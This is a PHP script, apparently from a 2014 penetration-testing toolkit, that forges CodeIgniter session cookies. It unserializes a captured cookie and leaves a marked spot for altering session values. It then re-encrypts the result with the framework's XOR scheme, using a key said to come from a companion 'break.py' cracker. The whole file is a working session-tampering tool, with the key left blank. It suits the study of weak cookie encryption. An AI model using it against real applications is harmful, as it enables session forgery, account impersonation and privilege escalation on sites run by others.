<?php

// Copyright (c) 2014 Robin Bailey @ Dionach Ltd.

// Usage : $ php encrypt.php rawcookie.txt


// Taken from the CodeIgniter Framework
function _xor_merge($string, $key)
{
    $hash = $key;
    $str = '';
    for ($i = 0; $i < strlen($string); $i++)
    {
        $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
    }

    return $str;
}


// Taken from the CodeIgniter Framework
function _xor_encode($string, $key)
{
    $rand = '';
    while (strlen($rand) < 32)
    {
        $rand .= mt_rand(0, mt_getrandmax());
    }

    $rand = sha1($rand);

    $enc = '';
    for ($i = 0; $i < strlen($string); $i++)
    {
        $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
    }

    return _xor_merge($enc, $key);
}


// Read the cookie
if (isset($argv[1]))
{
    $rawcookie = file_get_contents($argv[1]);
}
else
{
    echo "Usage: $ php encrypt.php <raw cookie file>\n\n";
    exit;
}

//
// The (hashed) key to use, find it with break.py
//
$key = "";

$cookiearray = unserialize($rawcookie);

// Session array modification code goes here
//$cookiearray['foo'] = "bar";

$rawcookie = serialize($cookiearray);

$binarycookie = _xor_encode($rawcookie, $key);
echo urlencode(base64_encode($binarycookie));

?>
